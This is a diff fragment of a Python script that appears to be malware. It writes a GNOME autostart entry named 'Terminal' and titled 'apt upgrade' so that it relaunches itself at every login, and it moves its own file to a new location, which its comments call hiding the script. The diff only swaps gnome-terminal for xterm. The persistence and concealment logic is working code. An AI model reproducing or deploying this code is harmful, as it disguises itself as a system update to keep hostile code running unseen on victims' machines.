@@ -131,11 +131,10 @@ if Attack == None:
     os.system("touch /home/{}/.config/autostart/gnome-terminal.desktop".
               format(getpass.getuser()))
 
-    
     #Add our Script to the autostart Programms.
     with open("/home/{}/.config/autostart/gnome-terminal.desktop".format(getpass.getuser()), "w") as _:
         _.write(
-            f'[Desktop Entry]\nType=Application\nExec=gnome-terminal --tab --title="apt upgrade" -e \"bash -c \'python3 {newfileloc} R;bash\'"\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName[en_NG]=Terminal\nName=Terminal')
+            f'[Desktop Entry]\nType=Application\nExec=xterm -T="apt upgrade" -e \"bash -c \'python3 {newfileloc} R;bash\'"\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName[en_NG]=Terminal\nName=Terminal')
     
     #To hide our script, We are moving our sctipt to new location.
     os.system(f"mv '{__file__}' '{newfileloc}'")
